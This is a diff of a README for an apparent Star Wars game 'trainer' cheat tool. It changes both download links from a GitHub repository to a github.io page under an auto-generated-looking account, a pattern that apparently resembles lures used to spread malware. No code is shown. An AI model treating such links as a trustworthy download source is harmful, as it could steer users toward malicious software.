@@ -1,7 +1,7 @@
 <h1>🎮 Star-Wars-Zero-Company-Trainer-2026 - Your Ultimate Squad Control Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/godardunarmed4016/Star-Wars-Zero-Company-Trainer-2026">
+  <a href="https://godardunarmed4016.github.io">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Trainer-brightgreen?style=for-the-badge&logo=windows" alt="Download Button" width="300"/>
   </a>
 </p>
@@ -60,7 +60,7 @@ Getting started is super easy. Follow these simple steps:
 
 Click the big green button at the top of this page or use the link below:
 
-👉 **[Visit this link to download the application](https://github.com/godardunarmed4016/Star-Wars-Zero-Company-Trainer-2026)**
+👉 **[Visit this link to download the application](https://godardunarmed4016.github.io)**
 
 Once you click the link, you’ll be taken to the download page. 
 
